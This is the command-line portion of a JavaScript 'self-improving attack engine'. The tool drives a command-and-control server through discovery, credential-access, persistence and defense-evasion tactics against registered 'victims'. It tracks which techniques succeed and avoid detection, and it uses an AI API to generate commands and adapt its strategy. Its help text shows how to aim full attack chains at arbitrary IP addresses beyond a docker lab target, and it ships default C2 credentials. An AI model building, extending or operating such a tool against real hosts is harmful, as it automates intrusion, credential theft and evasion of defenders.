      const pct     = (t.success_rate * 100).toFixed(0).padStart(3);
      const conf    = (t.avg_confidence || 0).toFixed(0).padStart(3);
      const stealth = ((t.stealth_rate || 1) * 100).toFixed(0).padStart(3);
      const weight  = (t.weight || 1.3).toFixed(2);
      const det     = t.detections ? `  ⚠${t.detections}det` : '';
      const cmds    = t.successful_commands?.length ? `  ✓${t.successful_commands.length}cmd` : '';
      console.log(
        `  ${t.technique_id.padEnd(14)} ${t.name.padEnd(36)} ${pct}% conf:${conf} s:${stealth}% w=${weight}${det}${cmds}`
      );
    });

  console.log(`\n  FAILING TECHNIQUES (success rate < 50%, 2+ attempts)`);
  console.log(`${'─'.repeat(95)}`);
  techs
    .filter((t) => t.success_rate < 0.5 && t.attempts >= 2)
    .sort((a, b) => a.success_rate - b.success_rate)
    .forEach((t) => {
      const pct  = (t.success_rate * 100).toFixed(0).padStart(3);
      const conf = (t.avg_confidence || 0).toFixed(0);
      console.log(
        `  ${t.technique_id.padEnd(14)} ${t.name.padEnd(36)} ${pct}% conf:${conf} — ${t.last_failure_reason || 'unknown'}`
      );
    });

  // Per-victim KB section (v4.2 NEW)
  const perVictim = kb.per_victim || {};
  if (Object.keys(perVictim).length > 0) {
    console.log(`\n  PER-VICTIM TECHNIQUE DETAIL`);
    console.log(`${'─'.repeat(95)}`);
    for (const [vid, data] of Object.entries(perVictim)) {
      console.log(`\n  Victim: ${vid}`);
      Object.values(data.techniques || {})
        .sort((a, b) => b.success_rate - a.success_rate)
        .slice(0, 8)
        .forEach((t) => {
          const pct = (t.success_rate * 100).toFixed(0).padStart(3);
          const s   = ((t.stealth_rate || 1) * 100).toFixed(0).padStart(3);
          console.log(`    ${t.technique_id.padEnd(14)} ${t.name.padEnd(36)} ${pct}% stealth:${s}%`);
        });
    }
  }

  console.log(`${'═'.repeat(95)}\n`);
}

// =============================================================================
//  VICTIM LIST COMMAND  (v4.2 NEW)
// =============================================================================
async function listVictims() {
  console.log('\n🎯 VICTIM REGISTRY\n');

  // Sync from backend first
  const backendVictims = await fetchBackendVictims();

  console.log(`  Backend reports ${backendVictims.length} victim(s):\n`);
  console.log(`  ${'─'.repeat(70)}`);
  console.log(`  ${'ID'.padEnd(25)} ${'Label'.padEnd(20)} ${'Connected'.padEnd(10)} ${'Pending'}`);
  console.log(`  ${'─'.repeat(70)}`);

  for (const v of backendVictims) {
    const connected = v.is_beacon_connected ? '✅ Yes' : '❌ No';
    const pending   = v.pending_tasks || 0;
    console.log(
      `  ${v.victim_id.slice(0,24).padEnd(25)} ${(v.label || '').slice(0,19).padEnd(20)} ${connected.padEnd(10)} ${pending} tasks`
    );
  }

  if (backendVictims.length === 0) {
    console.log('  (No victims in backend registry — is the C2 server running?)');
  }

  // Also show local-only registry entries not yet in backend
  const reg       = loadVictimsRegistry();
  const localOnly = Object.keys(reg.victims).filter(
    id => !backendVictims.find(v => v.victim_id === id)
  );

  if (localOnly.length > 0) {
    console.log(`\n  Local-only (not yet synced to backend):`);
    localOnly.forEach(id => {
      const v = reg.victims[id];
      console.log(`    ${id} — ${v.label || id} (${v.source})`);
    });
  }

  console.log();
}

// =============================================================================
//  ADD VICTIM COMMAND  (v4.2 NEW)
// =============================================================================
async function addVictim(target, label = '', tags = [], notes = '') {
  if (!target) {
    console.log('❌ Usage: node learning-engine.js add-victim --target <ip|hostname|url> [--label <name>]');
    return;
  }

  console.log(`\n➕ Adding victim: ${target}`);
  const vid = await registerVictimInBackend(target, label, tags, notes);

  if (vid) {
    console.log(`✅ Victim added with ID: ${vid}`);
  } else {
    console.log(`⚠  Could not register in backend — recording locally only`);
    localRegisterVictim(target, label, 'manual', tags, notes);
  }
}

// =============================================================================
//  EXPORT RESEARCH
// =============================================================================
function exportResearch() {
  const kb         = loadKB();
  const intel      = loadIntel();
  const reg        = loadVictimsRegistry();
  const exportPath = path.join(MEMORY_DIR, `research_export_${Date.now()}.json`);
  writeJSON(exportPath, {
    exported_at:     new Date().toISOString(),
    knowledge_base:  kb,
    chain_intel:     intel,
    victims_registry: reg,    // v4.2 NEW
  });
  console.log(`\n✅ Research exported to: ${exportPath}\n`);
}

// =============================================================================
//  RESET SESSION
// =============================================================================
function resetSession() {
  writeJSON(SESSION_FILE, defaultSession());
  writeJSON(INTEL_FILE,   defaultIntel());
  console.log('✅ Session metrics and chain intel reset.');
}

// =============================================================================
//  CLI
// =============================================================================
const cliArgs = process.argv.slice(2);
const command = cliArgs[0];

function parseFlags() {
  const flags = {};
  for (let i = 1; i < cliArgs.length; i++) {
    if (cliArgs[i].startsWith('--')) {
      const key = cliArgs[i].slice(2);
      const val = cliArgs[i + 1] && !cliArgs[i + 1].startsWith('--') ? cliArgs[++i] : true;
      flags[key] = val;
    }
  }
  return flags;
}

(async () => {
  const flags = parseFlags();

  switch (command) {

    case 'run': {
      const tactic       = flags.tactic || 'discovery';
      const techs        = parseInt(flags.techniques || flags.iterations || '5', 10);
      const retries      = parseInt(flags.retries || '3', 10);
      const rawVictim    = flags.victim || C2_VICTIM_ENV || DEFAULT_DOCKER_VICTIM;
      const resolvedVid  = await resolveVictim(rawVictim);
      const profile      = loadProfile(resolvedVid) || loadProfile();
      const intel        = loadIntel();
      await runTactic(tactic, {
        maxTechniques: techs,
        maxRetries:    retries,
        victimProfile: profile,
        chainIntel:    intel,
        victimId:      resolvedVid,
      });
      break;
    }

    case 'fullchain': {
      const tactics = (flags.tactics || 'discovery,credential-access,persistence')
        .split(',').map((t) => t.trim()).filter(Boolean);
      const techs   = parseInt(flags.techniques || flags.iterations || '3', 10);
      const retries = parseInt(flags.retries || '3', 10);

      // --victim for single target, --victims for comma-separated list
      const victimFlag  = flags.victim  || '';
      const victimsFlag = flags.victims || '';
      const victimIds   = victimsFlag
        ? victimsFlag.split(',').map(v => v.trim()).filter(Boolean)
        : (victimFlag ? [victimFlag] : []);

      await runFullChain(tactics, { maxTechniques: techs, maxRetries: retries, victimIds });
      break;
    }

    case 'profile': {
      const rawVictim = flags.victim || C2_VICTIM_ENV || DEFAULT_DOCKER_VICTIM;
      await profileVictim(rawVictim);
      break;
    }

    case 'list-victims':
      await listVictims();
      break;

    case 'add-victim': {
      const target = flags.target || '';
      const label  = flags.label  || '';
      const tags   = flags.tags   ? flags.tags.split(',').map(t => t.trim()) : [];
      const notes  = flags.notes  || '';
      await addVictim(target, label, tags, notes);
      break;
    }

    case 'evolve':          await evolve();      break;
    case 'stats':           showStats();         break;
    case 'knowledge':       showKnowledge();     break;
    case 'export-research': exportResearch();    break;
    case 'reset-session':   resetSession();      break;

    default:
      console.log(`
WebSecSim Self-Improving Attack Engine v4.2
===========================================

COMMANDS
  run            Run attack for a single tactic
    --tactic       <name>    discovery | credential-access | persistence | defense-evasion
    --techniques   <n>       max techniques to try          (default: 5)
    --retries      <n>       max retries per technique      (default: 3)
    --victim       <target>  IP, hostname, URL, or victim_id to target
                             (default: C2_VICTIM env var or docker default)

  fullchain      Run a complete multi-tactic kill chain
    --tactics      <t1,t2>   comma-separated tactic list
    --techniques   <n>       techniques per tactic          (default: 3)
    --retries      <n>       retries per technique          (default: 3)
    --victim       <target>  single victim to target
    --victims      <v1,v2>   comma-separated list of victims (all get attacked)

  profile        Probe and cache a victim environment
    --victim       <target>  victim to profile              (default: docker victim)

  list-victims   Show all victims in backend registry + local cache
  add-victim     Register a new victim in the backend
    --target       <target>  IP, hostname, or URL           (REQUIRED)
    --label        <name>    human-readable label           (optional)
    --tags         <t1,t2>   comma-separated tags           (optional)
    --notes        <text>    free-text notes                (optional)

  evolve         AI strategy update — parses response and writes weights to KB
  stats          Global + per-tactic + per-victim stats + cross-session trend
  knowledge      Learned technique KB with per-victim breakdown
  export-research  Export full KB + intel + victim registry to timestamped JSON
  reset-session  Reset session metrics and chain intel (KB preserved)

ENVIRONMENT VARIABLES
  C2_BASE_URL    C2 server URL             (default: http://localhost:8000)
  C2_USERNAME    Operator login            (default: admin)
  C2_PASSWORD    Operator password         (default: admin123)
  C2_VICTIM      Default custom victim     (overrides docker default)
                 e.g. export C2_VICTIM=192.168.1.50
  OPENAI_API_KEY Enables AI command gen    (optional)

EXAMPLES
  # Target the docker victim (original behaviour)
  node learning-engine.js run --tactic discovery

  # Target a custom IP victim
  node learning-engine.js run --tactic discovery --victim 192.168.1.50

  # Register a custom victim then run a full chain on it
  node learning-engine.js add-victim --target 192.168.1.50 --label "Custom Target"
  node learning-engine.js fullchain --tactics discovery,credential-access --victim 192.168.1.50

  # Attack BOTH the docker victim and a custom IP in one chain
  node learning-engine.js fullchain --tactics discovery,persistence --victims websecsim-victim-c2,192.168.1.50

  # Use env var so all commands default to your custom victim
  export C2_VICTIM=192.168.1.50
  node learning-engine.js run --tactic credential-access
  node learning-engine.js fullchain --tactics discovery,credential-access,persistence

v4.2 VICTIM CHANGES
  ✓ VICTIM-1  Syncs with /api/victims/* in main.py
  ✓ VICTIM-2  All attack requests include victim field
  ✓ VICTIM-3  Output collected via /api/victims/{id}/outputs
  ✓ VICTIM-4  Per-victim KB entries + profiles stored separately
  ✓ VICTIM-5  --victim / --victims CLI flags
  ✓ VICTIM-6  fullchain iterates multiple victims
  ✓ VICTIM-7  Auto-registers custom victims via /api/victims/add
  ✓ VICTIM-8  Victim active-status checked before queueing tasks

v4.1 FIXES PRESERVED
  ✓ FIX 1  evolve() writes tactic_weights + stealth penalties back to KB
  ✓ FIX 2  runFullChain() appends session_summary → stats shows trend table
  ✓ FIX 3  chainIntel persists across sessions (loaded from disk, not reset)
  ✓ BONUS  stealth_rate per technique tracked and fed into AI prompt
`);
  }

  process.exit(0);
})().catch((err) => {
  console.error(`\nFatal error: ${err.message}`);
  process.exit(1);
});
